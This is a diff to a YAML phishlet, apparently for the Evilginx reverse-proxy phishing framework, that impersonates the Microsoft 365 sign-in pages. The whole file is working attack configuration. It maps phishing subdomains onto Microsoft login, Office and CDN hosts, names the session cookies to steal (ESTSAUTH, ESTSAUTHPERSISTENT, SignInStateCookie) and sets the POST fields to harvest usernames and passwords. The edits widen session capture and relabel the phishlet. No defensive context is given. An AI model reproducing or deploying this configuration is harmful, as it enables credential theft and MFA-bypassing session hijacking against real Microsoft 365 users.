@@ -1,24 +1,22 @@
-name: 'o365'
-author: '@jamescullum'
-min_ver: '2.3.0'
+name: "Microsoft 365 Enterprise"
+min_ver: '3.2.0'
+redirect_url: 'https://office.com'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-  - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
 credentials:
   username:
-    key: '(login|UserName)'
+    key: 'login'
     search: '(.*)'
     type: 'post'
   password:
-    key: '(passwd|Password)'
+    key: 'passwd'
     search: '(.*)'
     type: 'post'
 login:
